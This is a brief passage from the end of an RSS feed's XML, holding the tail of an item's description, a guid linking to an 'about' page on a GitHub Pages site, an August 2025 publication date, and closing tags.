sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/about.html</guid><pubDate>Sun, 10 Aug 2025 07:51:10 +0000</pubDate></item></channel></rss>